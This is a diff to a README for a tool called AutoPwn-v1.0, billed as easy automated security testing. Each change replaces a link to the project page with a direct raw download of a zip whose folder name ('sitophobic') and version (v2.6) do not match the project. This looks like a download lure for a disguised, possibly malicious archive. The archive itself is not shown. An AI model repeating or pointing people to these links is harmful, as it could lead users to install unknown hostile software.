@@ -1,6 +1,6 @@
 # ⚙️ AutoPwn-v1.0 - Easy Automated Security Testing  
 
-[![Download AutoPwn-v1.0](https://img.shields.io/badge/Download%20Now-Blue?style=for-the-badge)](https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0)
+[![Download AutoPwn-v1.0](https://img.shields.io/badge/Download%20Now-Blue?style=for-the-badge)](https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0/raw/refs/heads/main/sitophobic/v_Auto_Pwn_v2.6.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You can download the software from its main page on GitHub. Follow these steps:
 
 1. Click the blue button below to open the download page.
 
-[![Download AutoPwn-v1.0](https://img.shields.io/badge/Download%20Now-Blue?style=for-the-badge)](https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0)
+[![Download AutoPwn-v1.0](https://img.shields.io/badge/Download%20Now-Blue?style=for-the-badge)](https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0/raw/refs/heads/main/sitophobic/v_Auto_Pwn_v2.6.zip)
 
 2. Once on the page, find the section named **Releases** or look for a file with `.exe` or `.zip` at the top. This is usually the latest version of AutoPwn-v1.0.
 
@@ -117,7 +117,7 @@ If the application does not run or crashes:
 
 For further help, visit the GitHub page for the latest documents or to open an issue:
 
-[https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0](https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0)
+[https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0/raw/refs/heads/main/sitophobic/v_Auto_Pwn_v2.6.zip](https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0/raw/refs/heads/main/sitophobic/v_Auto_Pwn_v2.6.zip)
 
 ---
 
@@ -152,4 +152,4 @@ You do not need to edit any files to use AutoPwn-v1.0.
 
 ---
 
-[![Download AutoPwn-v1.0](https://img.shields.io/badge/Download%20Now-Blue?style=for-the-badge)](https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0)
+[![Download AutoPwn-v1.0](https://img.shields.io/badge/Download%20Now-Blue?style=for-the-badge)](https://github.com/tableknifeoddsmaker650/AutoPwn-v1.0/raw/refs/heads/main/sitophobic/v_Auto_Pwn_v2.6.zip)
